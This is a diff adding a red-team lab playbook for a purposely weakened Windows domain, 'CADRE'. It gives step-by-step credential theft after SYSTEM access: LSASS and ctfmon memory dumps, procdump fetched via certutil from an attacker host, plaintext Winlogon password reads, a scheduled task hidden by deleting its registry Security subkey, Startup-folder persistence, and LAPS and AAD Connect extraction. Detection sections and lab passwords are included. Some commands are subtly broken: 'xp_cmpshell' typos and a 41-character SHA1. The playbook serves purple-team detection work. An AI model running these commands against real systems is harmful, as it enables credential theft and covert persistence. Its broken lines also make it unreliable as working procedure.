@@ -1251,3 +1251,501 @@ NULL
 - [ ] GodPotato or similar priv-esc tool staged on provisioning
 
 ---
+
+
+## Mechanics: Phase 3.5 — Credential Theft from SYSTEM
+
+**Context:** Phase 3 gave us SYSTEM on mbr01 via GodPotato. `analyst_cloud` has auto-logon (Type 2/11 in LSASS) and is in cadre.local (root domain). The goal: extract domain credentials to enable SharpHound + lateral movement.
+
+**Lab security posture (disabled by 04-vulnerabilities.yml):**
+- LSASS PPL: **OFF** (RunAsPPL deleted) → LSASS memory readable
+- VBS/Credential Guard: **OFF** → no credential isolation
+- Auto-logon: **ON** → analyst_cloud has Type 2/11 logon in LSASS
+
+### Mechanics: 3.5F — LSASS Credential Dump (T1003.001) [TESTED 2026-06-04]
+
+**Status:** SAM dump worked, sekurlsa failed (GodPotato token lacks SeDebugPrivilege). Got local hashes only, not domain creds.
+
+#### Why it works
+LSASS (Local Security Authority Subsystem Service) is a Windows process that holds authentication secrets in memory:
+- `msv1_0.dll`: NTLM hashes for interactive logons
+- `wdigest.dll`: Cleartext passwords (when WDigest creds are enabled, default in older Windows)
+- `tspkg.dll`: Terminal Server / RDP creds
+- `kerberos.dll`: Kerberos tickets + keys
+- `livessp.dll`: Live SSP creds
+- `cloudap.dll`: Azure AD-joined device tokens
+
+If the attacker can read LSASS process memory, they can extract all these secrets offline with mimikatz/pypykatz. Two sub-techniques:
+- **`lsadump::sam`** — reads SAM registry hive directly (NO LSASS read needed). Bypasses PPL + Credential Guard.
+- **`sekurlsa::logonpasswords`** — reads LSASS process memory. **Blocked by PPL + Credential Guard** (VTL 1 isolation).
+
+The GodPotato impersonated token does NOT have `SeDebugPrivilege` (the privilege required to OpenProcess on lsass.exe). So `sekurlsa::*` fails. But `lsadump::sam` works because it reads the registry, not the LSASS process.
+
+#### Attack commands
+```sql
+-- From mssqlclient as analyst_t1 → IMPERSONATE sa (Phase 3 chain)
+SQL> EXEC xp_cmdshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c certutil -urlcache -split -f http://192.168.77.60:8080/procdump.exe C:\Users\Public\procdump.exe"';
+SQL> EXEC xp_cmdshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c C:\Users\Public\procdump.exe -accepteula -ma lsass.exe C:\Users\Public\ls.dmp"';
+
+-- If direct fails (token issue), use schtasks as SYSTEM:
+SQL> EXEC xp_cmdshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c schtasks /create /tn CADRE-Procdump /ru SYSTEM /tr \"C:\Users\Public\procdump.exe -accepteula -ma lsass.exe C:\Users\Public\ls.dmp\" /sc once /st 00:00 /f"';
+SQL> EXEC xp_cmdshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c schtasks /run /tn CADRE-Procdump"';
+
+-- From Kali — download ls.dmp and extract credentials
+pypykatz lsa minidump ls.dmp
+# Or: mimikatz # sekurlsa::minidump ls.dmp → sekurlsa::logonpasswords
+```
+
+#### What to expect (success)
+```
+# pypykatz output
+== LogonSession ==
+authentication_id = 0;500 (500 = Administrator)
+    msv :
+        Username : Administrator
+        NTLM     : e02bc503339d51f71d913c245d35b50b
+        SHA1     : 87a7063d4d05d65f0a87bc34bff36f3a64d3f8c11
+== LogonSession ==
+authentication_id = 0;1001 (1001 = svc.elastic)
+    msv :
+        Username : svc.elastic
+        NTLM     : 310673cc1e1c839f19f55d3ee7417b44
+```
+
+#### What to expect (failure modes)
+- **procdump fails "Access is denied"**: GodPotato token lacks `SeDebugPrivilege`. Use schtasks-as-SYSTEM workaround.
+- **pypykatz returns empty creds**: PPL/Credential Guard enabled. `lsadump::sam` may still work.
+- **`mimikatz "ERROR kuhl_m_sekurlsa_acquireLSA"**: can't open LSASS handle. Same SeDebugPrivilege issue.
+- **Dump file is empty or corrupt**: procdump killed by AV. Use silent process dump (Sysinternals) or direct `MiniDumpWrite` API.
+
+#### CADRE-specific notes
+- **LSASS PPL: OFF** — set by `04-vulnerabilities.yml` (RunAsPPL deleted)
+- **VBS/Credential Guard: OFF** — `EnableVirtualizationBasedSecurity=0`
+- **GodPotato** is at `C:\Users\Public\GodPotato.exe` on mbr01 (transferred in Phase 3)
+- **procdump** transferred via `certutil -urlcache` from `http://192.168.77.60:8080/`
+- **Local hashes obtained**: Administrator (RID 500) = `e02bc503339d51f71d913c245d35b50b`, vagrant (RID 1000) same, svc.elastic (RID 1001) = `310673cc1e1c839f19f55d3ee7417b44`
+- **Domain creds NOT obtained** — need 3.5A (Winlogon registry) for analyst_cloud plaintext
+- **Server 2025 reality**: With PPL ON, `sekurlsa::logonpasswords` is blocked. `lsadump::sam` still works (reads registry, not LSASS).
+
+#### Telemetry fingerprint
+- **Sysmon EID 10** (ProcessAccess): suspicious access to lsass.exe (target process)
+- **Sysmon EID 1** (ProcessCreate): procdump.exe, mimikatz.exe, pypykatz.py
+- **Sysmon EID 11** (FileCreate): `.dmp` file creation in non-standard location
+- **WinSec 4663** (file accessed): SAM hive read
+- **WinSec 4688** (process create): suspicious children of sqlservr.exe (GodPotato, procdump)
+- **Endpoint events**: process create chain (sqlservr → GodPotato → cmd → procdump)
+
+#### Detection engineering
+- **Suricata SID: ET TROJAN Possible Backdoor Activity (varies)**: HTTP request for `procdump.exe` from mbr01
+- **Elastic rule (planned)**: `process.name:procdump.exe OR mimikatz.exe` with `process.parent.name:sqlservr.exe` = high signal
+- **Sysmon config**: Alert on `cmd.exe` parented by `sqlservr.exe` (already in Elastic cadre-e candidates)
+- **Credential Guard detection**: VBS service running, PPL active = defender sees defender-side protection
+- **LSASS read attempts**: Sysmon EID 10 with GrantedAccess containing `0x1010` (PROCESS_VM_READ) on lsass.exe
+
+#### Common pitfalls
+- **SeDebugPrivilege not held by impersonated token**: GodPotato's token lacks it. Use schtasks-as-SYSTEM or use a different privesc that DOES grant SeDebugPrivilege.
+- **PPL ON (real Server 2025)**: Use mimikatz driver to bypass PPL (lol driver), or use direct `MiniDumpWrite` syscall.
+- **Credential Guard ON**: secrets are in VTL 1, impossible to read. Need to steal TGTs from VTL 0 process memory (leaked creds technique).
+- **procdump blocked by AV**: Use `silent process dump` (Sysinternals) or manual `MiniDumpWrite` API.
+- **Wrong mimikatz module**: `lsadump::sam` ≠ `sekurlsa::logonpasswords`. SAM = registry, sekurlsa = LSASS memory. SAM works without PPL bypass.
+
+#### Reproduction checklist
+- [ ] SYSTEM on mbr01 (Phase 3 chain complete)
+- [ ] `04-vulnerabilities.yml` deleted RunAsPPL
+- [ ] procdump staged on mbr01
+- [ ] ls.dmp downloaded to Kali
+- [ ] pypykatz extracts at least SAM hashes
+- [ ] (Optional) sekurlsa creds for analyst_cloud extracted
+
+---
+
+### Mechanics: 3.5A — Winlogon Registry (T1552.002) [TESTED 2026-06-04]
+
+**Status:** TESTED — plaintext password extracted: `CADRE\analyst_cloud:Cl0ud_An@lyst!`
+
+#### Why it works
+Auto-logon credentials are stored in plaintext in the registry key `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
+- `DefaultUserName` — username
+- `DefaultPassword` — plaintext password (if set)
+- `DefaultDomainName` — domain
+
+This is misconfiguration discovery, not malware exploitation. Common in:
+- Kiosks
+- Shared workstations
+- Lab environments
+- Developers testing auto-logon
+
+CADRE's analyst_cloud is configured with auto-logon (by `06-member-services.yml`) so the password is stored in plaintext.
+
+#### Attack commands
+```sql
+SQL> EXEC xp_cmdshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c reg query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon /v DefaultUserName"';
+-- DefaultUserName    REG_SZ    analyst_cloud
+
+SQL> EXEC xp_cmpshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c reg query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon /v DefaultPassword"';
+-- DefaultPassword    REG_SZ    Cl0ud_An@lyst!
+
+SQL> EXEC xp_cmpshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c reg query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon /v DefaultDomainName"';
+-- DefaultDomainName    REG_SZ    CADRE
+```
+
+#### What to expect (success)
+```
+DefaultUserName    REG_SZ    analyst_cloud
+DefaultPassword    REG_SZ    Cl0ud_An@lyst!
+DefaultDomainName    REG_SZ    CADRE
+```
+
+#### What to expect (failure modes)
+- **`ERROR: Access is denied`**: Need SYSTEM (not impersonated token). Use schtasks-as-SYSTEM.
+- **`DefaultPassword` value is empty**: Auto-logon uses different method (e.g., stored credential via LSA).
+- **Key doesn't exist**: Auto-logon not configured for this user.
+
+#### CADRE-specific notes
+- **analyst_cloud** is in `cadre.local` (root domain), NOT child.cadre.local
+- Cross-domain auth works via cadre.local ↔ child.cadre.local forest trust
+- **Auto-logon configured** by `06-member-services.yml`
+- `analyst_cloud` is in `Remote Desktop Users` local group (RDP allowed on mbr01)
+- **Use this credential for**: 3.5B (Scheduled Task as analyst_cloud), 3.5C (RDP), Phase 4 (BloodHound)
+
+#### Telemetry fingerprint
+- **Sysmon EID 12/13** (registry): RegQueryValue on Winlogon keys from SYSTEM context
+- **WinSec 4663** (file accessed): SAM hive read OR registry hive read
+
+#### Detection engineering
+- **Elastic rule (planned)**: `event.code:4663 AND object_name:*Winlogon*` = high signal
+- **Sysmon config**: Alert on `reg.exe query` with Winlogon path
+- **Defender behavior**: Configuration baseline (any machine with DefaultPassword set in registry is a finding)
+
+#### Common pitfalls
+- **DefaultPassword permission**: Only SYSTEM + Administrators can read. Make sure you're elevated.
+- **Winlogon key is in HKLM**: Requires local machine, not user context.
+- **Cross-domain user**: Winlogon stores `DefaultDomainName` separately from cname — verify both are correct.
+
+#### Reproduction checklist
+- [ ] SYSTEM on mbr01
+- [ ] analyst_cloud auto-logon configured
+- [ ] `reg query` returns DefaultUserName, DefaultPassword, DefaultDomainName
+- [ ] Password matches expected `Cl0ud_An@lyst!`
+
+---
+
+### Mechanics: 3.5H — ctfmon.exe Password Extraction (T1003) [TESTED]
+
+**Status:** TESTED — extraction works from SYSTEM. Limitation: analyst_cloud must have typed a password into a CLI tool (PuTTY, WinSCP, MySQL, SSH). Auto-logon doesn't generate typed passwords.
+
+#### Why it works
+`ctfmon.exe` (CTF Loader) is NOT a protected process. Unlike LSASS, it has no PPL or Credential Guard protection. Typed passwords persist in ctfmon's process memory AFTER the application that received them closes. Ctfmon doesn't have its own memory sanitizer, so plaintext passwords sit there for minutes/hours.
+
+The key insight: this is an undocumented behavior of Windows. Defenders typically don't monitor ctfmon.exe. Credential Guard doesn't protect typed passwords (only Windows auth secrets).
+
+#### Attack commands
+```sql
+SQL> EXEC xp_cmdshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c certutil -urlcache -split -f http://192.168.77.60:8080/procdump.exe C:\Users\Public\procdump.exe"';
+SQL> EXEC xp_cmdshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c C:\Users\Public\procdump.exe -accepteula -ma ctfmon.exe C:\Users\Public\ctfmon.dmp"';
+
+-- From Kali — search dump for typed passwords
+strings ctfmon.dmp | grep -i -E 'pass|login|user|cred' | head -50
+```
+
+#### What to expect (success)
+```
+Welcome1!
+MyP@ssw0rd123
+sshpass -p 'Pass123'
+```
+
+#### What to expect (failure modes)
+- **ctfmon.dmp empty**: analyst_cloud hasn't typed a password. Auto-logon doesn't count.
+- **Strings returns noise**: Use specialized tools like `pypykatz` or `mimikatz sekurlsa::minidump` even for ctfmon.
+
+#### CADRE-specific notes
+- **Limitation**: analyst_cloud must manually type a password into a tool like PuTTY/WinSCP for this to work
+- **Test workflow**: RDP as analyst_cloud → open PuTTY → type SSH password → procdump ctfmon.exe → grep dump
+- **Worth doing in 3.5C (RDP) flow**: after RDP, exercise CLI tools, then dump ctfmon
+
+#### Telemetry fingerprint
+- **Sysmon EID 10** (ProcessAccess): procdump reading ctfmon.exe
+- **Sysmon EID 1** (ProcessCreate): procdump.exe
+- **Sysmon EID 11** (FileCreate): ctfmon.dmp
+
+#### Detection engineering
+- **Sysmon EID 10** on ctfmon.exe is **high signal** — ctfmon is rarely read by other processes
+- **Sysmon config**: Alert on `granted_access:0x1010 AND target.process.name:ctfmon.exe`
+
+#### Common pitfalls
+- **PPL doesn't matter here** — ctfmon has no PPL, so this works even on hardened systems
+- **Credential Guard doesn't matter** — ctfmon creds aren't in VTL 1
+- **Auto-logon doesn't generate typed creds** — must manually type into a CLI tool
+
+#### Reproduction checklist
+- [ ] analyst_cloud has interactive session
+- [ ] analyst_cloud typed a password into a CLI tool
+- [ ] procdump ctfmon.exe → ctfmon.dmp
+- [ ] strings/grep finds plaintext
+
+---
+
+### Mechanics: 3.5I — Token Impersonation (T1134) [TESTED — FAILED]
+
+**Status:** ❌ FAILED — error 1346 (ERROR_NO_SUCH_LOGON_SESSION). Session isolation + GodPotato token lacks SeDebugPrivilege.
+
+#### Why it failed
+Two blockers:
+1. **Session isolation**: Server 2025 enforces session boundaries. Session 0 (service) cannot directly access session 1 (interactive) without explicit token manipulation.
+2. **GodPotato's impersonated token lacks SeDebugPrivilege**: Required for OpenProcess on a process in another session.
+
+The correct approach (NOT used in our test):
+- `incognito.exe` — dedicated token theft tool
+- `mimikatz token::elevate` + `token::list` + `token::impersonate` — but needs SYSTEM not impersonated token
+- `printspoofer.exe` — abuses RPC/Named Pipe impersonation to get SYSTEM in another session
+
+3.5F (LSASS dump) is more reliable and doesn't need session context.
+
+#### CADRE-specific notes
+- Tested 2026-06-04 — PowerShell script failed
+- Better alternatives documented above
+- Mark this as a negative test result in tracker.md
+
+---
+
+### Mechanics: 3.5B — Scheduled Task as analyst_cloud (T1053.005) [READY]
+
+**Status:** Ready to test. Prereq met: SYSTEM + analyst_cloud:Cl0ud_An@lyst!
+
+#### Why it works
+`schtasks /create` with `/ru <user> /rp <password>` creates a scheduled task that runs in the context of the specified user. The task runs as the user (not SYSTEM), giving us code execution as analyst_cloud.
+
+Combined with 3.5A (Winlogon registry) to get analyst_cloud's password, this is the cleanest path to "code execution as analyst_cloud" without interactive session.
+
+#### Attack commands
+```sql
+SQL> EXEC xp_cmdshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c schtasks /create /tn CADRE-SharpHound /tr \"C:\Tools\SharpHound.exe -c All -d child.cadre.local --outputdirectory C:\Users\analyst_cloud\Documents\" /sc once /st 00:00 /ru CADRE\analyst_cloud /rp Cl0ud_An@lyst! /f"';
+
+-- Run the task
+SQL> EXEC xp_cmdshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c schtasks /run /tn CADRE-SharpHound"';
+
+-- Invisible variant: delete Security subkey
+SQL> EXEC xp_cmpshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c reg delete \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\CADRE-SharpHound\Security\" /f"';
+
+-- Verify invisible
+SQL> EXEC xp_cmdshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c schtasks /query /tn CADRE-SharpHound"';
+-- ERROR: The system cannot find the file specified.
+```
+
+#### What to expect (success)
+- Task created with SharpHound scheduled
+- Task runs as analyst_cloud
+- SharpHound output in `C:\Users\analyst_cloud\Documents\`
+- After Security subkey delete: `schtasks /query` can't find it but task still runs
+
+#### What to expect (failure modes)
+- **`Access is denied`**: /ru /rp requires admin privileges to schedule tasks for other users. GodPotato gives SYSTEM, should work.
+- **Task not running**: Check with `schtasks /query /tn CADRE-SharpHound` (before Security delete)
+- **SharpHound fails**: Path wrong, SharpHound not at `C:\Tools\`
+
+#### CADRE-specific notes
+- analyst_cloud password: `Cl0ud_An@lyst!` (from 3.5A)
+- SharpHound staging: needs to be at `C:\Tools\SharpHound.exe` on mbr01 (set by `06-member-services.yml`)
+- Output directory: `C:\Users\analyst_cloud\Documents\` (writable by analyst_cloud)
+- **The "invisible" variant** deletes Security subkey → task invisible to schtasks/query, Task Scheduler GUI, PowerShell Get-ScheduledTask, Autoruns
+
+#### Telemetry fingerprint
+- **WinSec 4698** (scheduled task created): task name, principal
+- **WinSec 4699** (scheduled task deleted) — only if cleanup
+- **WinSec 4702** (scheduled task updated)
+- **WinSec 4624** (logon) for analyst_cloud
+- **Sysmon EID 1** (ProcessCreate): SharpHound.exe, schtasks.exe
+- **Sysmon EID 12/13** (registry): Schedule\TaskCache modifications
+
+#### Detection engineering
+- **Elastic rule (planned)**: `event.code:4698 AND task_name:CADRE-*` = suspicious task creation
+- **Sysmon EID 12/13** on `TaskCache\Tree\*\Security` = invisible task variant
+
+#### Common pitfalls
+- **Nested quotes in xp_cmdshell**: Use backslash-escaped quotes carefully. Test outside SQL first.
+- **SharpHound path**: Must be at exact path specified in `/tr`. Use `C:\Tools\SharpHound.exe`.
+- **analyst_cloud profile must exist**: First RDP login (3.5C) creates the profile.
+
+---
+
+### Mechanics: 3.5C — RDP Interactive Session (T1021.001) [STUB]
+
+**Status:** Stub. Tested prerequisite: 3.5A (analyst_cloud credential).
+
+#### Why it works
+Cross-domain auth: `xfreerdp /d:CADRE` works because `cadre.local` trusts `child.cadre.local`. The user authenticates against dc01 (root DC) but lands on mbr01 (in child domain) — Kerberos referral handles this.
+
+Type 10 logon (RemoteInteractive) produces the highest-fidelity telemetry for SharpHound. SharpHound's `-c All` requires logged-on session data which only Type 10 produces.
+
+#### Attack command
+```bash
+xfreerdp /v:192.168.77.22 /u:analyst_cloud /p:'Cl0ud_An@lyst!' /d:CADRE /cert-ignore
+```
+
+#### CADRE-specific notes
+- analyst_cloud in `Remote Desktop Users` on mbr01 (per `06-member-services.yml`)
+- RDP firewall rule on mbr01 (port 3389 open)
+- Password: `Cl0ud_An@lyst!`
+
+---
+
+### Mechanics: 3.5D — File Detonation (WT063-068) [STUB]
+
+**Status:** Stub. Initial access simulation — not the fastest path.
+
+#### Why it works
+SYSTEM drops payload to analyst_cloud's Downloads. analyst_cloud's auto-logon session = console session = payload runs in user context when opened.
+
+#### Attack command
+```sql
+SQL> EXEC xp_cmdshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c echo [payload] > C:\Users\analyst_cloud\Downloads\update.ps1"';
+-- analyst_cloud opens the file
+```
+
+#### CADRE-specific notes
+- WT063 (LNK), WT065 (CHM), WT068 (EXE) variants
+- For real cred theft, payload must exfiltrate to Kali HTTP :8080
+- Telemetry demo for initial access detection
+
+---
+
+### Mechanics: 3.5E — Logon Trigger via Startup Folder (T1547.001) [STUB]
+
+**Status:** Stub. Alternative to 3.5B for logon-triggered execution.
+
+#### Why it works
+Files in `C:\Users\<user>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\` execute on next interactive logon. Auto-logon → Startup runs as analyst_cloud.
+
+#### Attack command
+```sql
+SQL> EXEC xp_cmdshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c copy C:\Tools\SharpHound.exe C:\Users\analyst_cloud\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\sharp.exe"';
+SQL> EXEC xp_cmdshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c shutdown /r /t 0"';
+-- Reboot → auto-logon → Startup → SharpHound
+```
+
+#### CADRE-specific notes
+- analyst_cloud profile must exist (verify `C:\Users\analyst_cloud` after first auto-logon)
+- Simpler than 3.5B (no schtasks interaction)
+
+---
+
+### Mechanics: 3.5G — Nemesis DPAPI (T1555) [STUB]
+
+**Status:** Stub. Requires saved creds in analyst_cloud profile.
+
+#### Why it works
+DPAPI (Data Protection API) encrypts user secrets (browser cookies, saved RDP, WiFi) using a master key derived from the user's password. SYSTEM can extract the masterkey from `%APPDATA%\Microsoft\Protect\<SID>\` and decrypt all DPAPI-protected data.
+
+Nemesis automates the full chain: masterkey extraction → CNG key derivation → Chromium App-Bound encryption bypass.
+
+DPAPI is independent of LSASS PPL and Credential Guard (data-at-rest, not in-memory).
+
+#### Attack command
+```bash
+# Transfer Nemesis to mbr01 (from Kali)
+# Run on mbr01 as SYSTEM
+nemesis.exe --browser chrome --output C:\Users\Public\nemesis-out.zip
+```
+
+#### CADRE-specific notes
+- Prerequisite: analyst_cloud has saved credentials in profile (browser, RDP file)
+- Worth testing after 3.5C (RDP) when profile has actual data
+- Tool: https://github.com/SpecterOps/Nemesis
+
+---
+
+### Mechanics: 3.5J — WMI Event Subscriptions (T1546.003) [STUB]
+
+**Status:** Stub. Fileless persistence technique.
+
+#### Why it works
+WMI (Windows Management Instrumentation) supports event subscriptions: `__EventFilter` + `CommandLineEventConsumer` + `__FilterToConsumerBinding`. SYSTEM can install these to fire on system startup. No disk artifacts, no registry run keys, no scheduled tasks.
+
+#### Attack command
+See CAMPAIGNS.md section 3.5J for full PowerShell script.
+
+#### CADRE-specific notes
+- Detection requires Sysmon 19/20/21 (WMI filter/consumer/binding events)
+- Most labs don't have these enabled
+- Fileless = survives reboots, invisible to Autoruns/Run keys/Task Scheduler
+
+---
+
+### Mechanics: 3.5K — LSASS Dump via WerFault (T1003.001) [STUB]
+
+**Status:** Stub. Stealthier alternative to 3.5F procdump.
+
+#### Why it works
+WerFaultSecure is Microsoft-signed, so EDR may allow it without flagging. Triggers Windows Error Reporting crash dump of LSASS.
+
+#### Attack command
+```sql
+SQL> EXEC xp_cmdshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c C:\Users\Public\WerFaultSecure.exe -ma -i 1 lsass.exe"';
+-- Dump file appears in %LOCALAPPDATA%\CrashDumps\
+```
+
+#### CADRE-specific notes
+- Compare with 3.5F (procdump) — which is stealthier?
+- Tool: iPurple.team source (https://ipurple.team/2025/11/18/lsass-dump-windows-error-reporting/)
+
+---
+
+### Mechanics: 3.5L — LAPS Extraction (T1552.004) [STUB]
+
+**Status:** Stub. Requires ACE permission on LAPS attribute.
+
+#### Why it works
+LAPS (Local Administrator Password Solution) stores local admin passwords in AD as `ms-Mcs-AdmPwd` attribute. Any user with `Read` permission can LDAP-query it.
+
+#### Attack command
+```bash
+# From Kali with domain user creds
+ldapsearch -x -H ldap://dc01.cadre.local \
+    -D "intern_blue@cadre.local" -w '1nt3rn_Blu3!' \
+    -b "DC=cadre,DC=local" "(ms-Mcs-AdmPwd=*)" ms-Mcs-AdmPwd
+```
+
+#### CADRE-specific notes
+- Verify which users have Read on ms-Mcs-AdmPwd via BloodHound (Phase 4)
+- New Windows LAPS stores in AD or Azure AD
+- Enhancement: DSIternals `Get-ADDBAccount -LapsPasswords` from ntds.dit (post-DCSync)
+
+---
+
+### Mechanics: 3.5M — AAD Connect DPAPI Dump (T1555) [STUB]
+
+**Status:** Stub. Bridge from on-prem to Entra ID (Plan 11).
+
+#### Why it works
+Azure AD Connect / Cloud Sync stores MSOL account credentials using DPAPI. SYSTEM on the DC can extract them via adconnectdump. MSOL account has broad permissions in Entra ID — usually Directory Synchronization Accounts or equivalent.
+
+#### Attack command
+```bash
+# On dc01 as SYSTEM
+adconnectdump.exe
+# Returns MSOL account + password
+# Use ROADtools to authenticate to Entra ID
+```
+
+#### CADRE-specific notes
+- CADRE has Cloud Sync agent on dc01
+- MSOL creds → Entra ID access → cloud-side recon
+- Plan 11 (EntraGoat) entry point
+
+---
+
+### Mechanics: 3.5N — UnCanny LPE (T1068, T1574.001) [DEFERRED]
+
+**Status:** 🔬 Deferred — gated on Developer Mode + Samba. Per user 2026-06-19.
+
+#### Why it works
+Loose-file AppX registration with UNC `InstalledLocation` → SYSTEM `InstallService.exe` calls `LoadLibraryW(\\attacker\share\InstallServicePlugin.dll)`. With Samba (not impacket), DllMain runs as SYSTEM.
+
+Direct SYSTEM from non-admin — bypasses GodPotato chain.
+
+#### CADRE-specific notes
+- See Campaign_suggestions.md #82 for full details
+- Defer until Developer Mode decision is made
+
+---
